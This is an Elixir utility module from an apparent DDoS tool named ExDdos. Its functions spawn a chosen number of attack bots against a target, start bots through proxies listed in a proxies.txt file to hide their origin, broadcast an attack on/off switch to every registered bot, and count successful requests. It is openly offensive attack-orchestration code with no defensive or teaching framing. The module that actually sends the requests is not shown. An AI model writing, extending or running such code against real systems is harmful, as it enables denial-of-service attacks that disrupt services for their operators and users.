defmodule ExDdos.Utils do
  def start_num_of_bots(target, count) do
    for _ <- 1..count, do: Task.start(fn -> ExDdos.BotSupervisor.start_child({target}) end)
  end

  def start_bots_with_proxy(target) do
    "./proxies.txt"
    |> File.stream!()
    |> Stream.each(fn string ->
      [phost, pport] =
        string
        |> String.trim("\n")
        |> String.split(":", trim: true)

      ExDdos.BotSupervisor.start_child({target, phost, String.to_integer(pport)})
    end)
    |> Stream.run()
  end

  # faster than asking the supervisor
  def bot_count, do: Registry.count_match(BotRegistry, "bots", :_)

  def set_attack(value) do
    Registry.dispatch(BotRegistry, "bots", fn entries ->
      for {pid, _} <- entries, do: send(pid, {:set_attack, value})
    end)
  end

  def success_req_count, do: Cachex.get!(:counts, "success_req_count")
end
